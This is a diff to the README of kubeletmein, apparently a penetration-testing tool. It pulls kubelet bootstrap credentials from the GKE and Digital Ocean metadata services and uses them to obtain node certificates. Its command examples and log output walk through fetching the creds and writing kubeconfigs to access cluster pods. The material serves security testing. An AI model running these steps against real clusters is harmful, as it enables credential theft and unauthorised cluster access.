@@ -14,11 +14,15 @@ There's more info in our blog post at [https://www.4armed.com/blog/hacking-googl
 
 ### GKE
 
-Currently only GKE is supported and it relies on the metadata concealmeant being disabled (the default setting).
+GKE is fully supported and relies on the metadata concealmeant being disabled (the default setting).
 
 ### EKS
 
 I'm working on support for EKS. It's actually a lot easier to exploit this on EKS than GKE.
+
+### Digital Ocean
+
+By default, DO provides creds by metadata and this cannot be disabled.
 
 ### AKS
 
@@ -36,7 +40,8 @@ It's a single binary compiled for Linux. Download it with `cURL` or `wget` from 
 On GKE kubeletmein is a two stage process. First we write out a bootstrap-kubeconfig using the certificates and key from the `kube-env` instance attribute. Then we generate a certificate sigining request and use the bootstrap config to submit it to the API for approval.
 
 ```
-~ $ kubeletmein gke bootstrap
+~ $ kubeletmein bootstrap gke
+2018-11-29T21:21:26Z [ℹ]  fetching kubelet creds from metadata service
 2018-11-29T21:21:26Z [ℹ]  writing ca cert to: ca-certificates.crt
 2018-11-29T21:21:26Z [ℹ]  writing kubelet cert to: kubelet.crt
 2018-11-29T21:21:26Z [ℹ]  writing kubelet key to: kubelet.key
@@ -48,7 +53,7 @@ On GKE kubeletmein is a two stage process. First we write out a bootstrap-kubeco
 Then we download the certificate and configure `kubeconfig`.
 
 ```
-~ $ kubeletmein gke generate -n gke-cluster19-default-pool-6c73beb1-wmh3
+~ $ kubeletmein generate -n gke-cluster19-default-pool-6c73beb1-wmh3
 2018-11-29T21:23:33Z [ℹ]  using bootstrap-config to request new cert for node: gke-cluster19-default-pool-6c73beb1-wmh3
 2018-11-29T21:23:33Z [ℹ]  got new cert and wrote kubeconfig
 2018-11-29T21:23:33Z [ℹ]  now try: kubectl --kubeconfig kubeconfig get pods
@@ -64,6 +69,24 @@ kubectl --kubeconfig get pods
 
 Coming soon.....
 
+### Digital Ocean
+
+```
+~ $ kubeletmein bootstrap do
+2018-12-12T23:34:19Z [ℹ]  fetching kubelet creds from metadata service
+2018-12-12T23:34:19Z [ℹ]  writing ca cert to: ca-certificates.crt
+2018-12-12T23:34:19Z [ℹ]  generating bootstrap-kubeconfig file at: bootstrap-kubeconfig
+2018-12-12T23:34:19Z [ℹ]  wrote bootstrap-kubeconfig
+2018-12-12T23:34:19Z [ℹ]  now generate a new node certificate with: kubeletmein do generate
+```
+
+Now generate the kubeconfig with a downloaded cert
+```
+~ $ kubeletmein generate -n whatevs
+2018-12-12T23:36:46Z [ℹ]  using bootstrap-config to request new cert for node: whatevs
+2018-12-12T23:36:46Z [ℹ]  got new cert and wrote kubeconfig
+2018-12-12T23:36:46Z [ℹ]  now try: kubectl --kubeconfig kubeconfig get pods
+```
 
 ## Contributing
 
